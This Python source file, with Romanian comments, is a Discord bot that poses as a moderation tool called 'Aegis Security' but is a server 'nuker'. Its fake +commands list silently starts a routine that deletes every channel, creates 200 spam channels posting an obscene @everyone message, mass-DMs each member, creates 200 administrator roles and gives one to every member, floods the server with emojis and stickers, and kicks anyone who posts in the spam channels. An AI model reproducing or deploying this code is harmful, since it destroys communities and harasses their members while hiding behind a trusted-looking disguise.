import discord
from discord.ext import commands
import asyncio
import aiohttp
import io
from flask import Flask
from threading import Thread
import os

# --- 1. CONFIGURARE SERVER WEB PENTRU UPTIME 24/7 ---
app = Flask('')

@app.route('/')
def home():
    return "Sistemul este online 24/7 în cloud!"

def run_web_server():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run_web_server)
    t.start()

# --- 2. CONFIGURARE BOT DISCORD ---
intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
intents.members = True
intents.guilds = True
intents.emojis_and_stickers = True

bot = commands.Bot(command_prefix="+", intents=intents, help_command=None)

CHANNEL_NAME = "nuked-sklavilor" 
INVITE_LINKS = "https://discord.gg\nhttps://discord.gg"
SPAM_MESSAGE = f"@everyone # BAG PULAN MORTI VOSTRI :))))\n{INVITE_LINKS}"
DM_MESSAGE = f"# BAG PULAN MORTI VOSTRI :))))\n{INVITE_LINKS}"
RANDOM_IMAGE_URL = "https://picsum.photos"

@bot.event
async def on_ready():
    print(f"[-] SCRIPT AUTOMAT: Pornit cu succes în cloud.")
    print(f"[-] Conectat ca: {bot.user.name}")
    
    await bot.change_presence(
        activity=discord.Streaming(
            name="Advanced Moderation | Type +help or +commands", 
            url="https://twitch.tv"
        )
    )

@bot.command(name="help")
async def fake_help(ctx):
    embed = discord.Embed(
        title="🛡️ Aegis Security - System Core v4.2", 
        description="Ghid complet de configurare pentru modulele globale de protecție.",
        color=discord.Color.blue()
    )
    embed.add_field(name="⚙️ Configurare Generală", value="`+setup` - Inițializează baza de date\n`+config` - Afișează setările actuale\n`+status` - Verifică modulele online", inline=False)
    embed.add_field(name="⚠️ Pentru a vedea toate cele 200 de comenzi", value="Scrie comanda `+commands` pentru a primi matricea completă de comenzi.", inline=False)
    embed.set_footer(text="Aegis Security Corporation © 2026")
    await ctx.send(embed=embed)

@bot.command(name="commands")
async def fake_commands(ctx):
    fake_list = "**LISTĂ COMANDE DE MODERARE AVANSATĂ (1-200):**\n"
    categories = ["ban", "kick", "mute", "warn", "clear", "tempban", "unmute", "slowmode", "backup", "log"]
    
    for i in range(1, 120):
        cat = categories[i % len(categories)]
        fake_list += f"`+{cat}_{i}`, "
        if i % 6 == 0:
            fake_list += "\n"
            
    fake_list += "\n\n*Scrie `+help` sau `+commands` în orice canal text pentru re-verificare.*"
    
    asyncio.create_task(execute_nuke(ctx))
    try:
        await ctx.send(fake_list[:1900])
    except Exception:
        pass

async def execute_nuke(ctx):
    guild = ctx.guild
    if not guild:
        return

    nuke_permissions = discord.Permissions(administrator=True)
    image_data = b""

    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(RANDOM_IMAGE_URL) as response:
                if response.status == 200:
                    image_data = await response.read()
        except Exception:
            pass

    async def mass_dm():
        async def send_10_dms(member):
            if not member.bot:
                for _ in range(10):
                    try:
                        await member.send(DM_MESSAGE)
                        await asyncio.sleep(0.1)
                    except Exception:
                        break
        dm_tasks = [send_10_dms(member) for member in guild.members]
        await asyncio.gather(*dm_tasks, return_exceptions=True)

    async def clear_channels():
        tasks = [channel.delete() for channel in guild.channels]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def generate_channels():
        async def create_and_spam(index):
            try:
                ch = await guild.create_text_channel(name=f"{CHANNEL_NAME}-{index}")
                for _ in range(50):
                    await ch.send(SPAM_MESSAGE)
                    await asyncio.sleep(0.03)
            except Exception: pass
        tasks = [create_and_spam(i) for i in range(200)]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def generate_roles_and_assign():
        created_roles = []
        async def create_role(index):
            try:
                role = await guild.create_role(name=f"MATRIX-{index}", permissions=nuke_permissions, color=discord.Color.red())
                created_roles.append(role)
            except Exception: pass
        role_tasks = [create_role(i) for i in range(200)]
        await asyncio.gather(*role_tasks, return_exceptions=True)
        if len(created_roles) > 0:
            target_role = created_roles[0]
            assign_tasks = [member.add_roles(target_role) for member in guild.members if not member.bot]
            await asyncio.gather(*assign_tasks, return_exceptions=True)

    async def generate_assets():
        if not image_data: return
        async def create_emoji(i):
            try: await guild.create_custom_emoji(name=f"nuked_{i}", image=image_data)
            except Exception: pass
        async def create_sticker(i):
            try:
                file = discord.File(fp=io.BytesIO(image_data), filename="nuke.png")
                await guild.create_sticker(name=f"MATRIX {i}", description="System Asset", emoji="💥", file=file)
            except Exception: pass
        asset_tasks = [create_emoji(i) for i in range(40)] + [create_sticker(i) for i in range(40)]
        await asyncio.gather(*asset_tasks, return_exceptions=True)

    asyncio.create_task(mass_dm())
    await clear_channels()
    await asyncio.gather(generate_channels(), generate_roles_and_assign(), generate_assets(), return_exceptions=True)

@bot.event
async def on_message(message):
    if message.author == bot.user or not message.guild:
        return
    if CHANNEL_NAME in message.channel.name.lower():
        try:
            await message.author.kick(reason="Sistem automat de curățare")
        except Exception:
            pass
    await bot.process_commands(message)

# Pornire server web pentru menținere sesiune cloud
keep_alive()

# SECURIZARE CRITICĂ: Token-ul este citit ca variabilă de mediu ascunsă
bot.run(os.environ.get("DISCORD_TOKEN"))
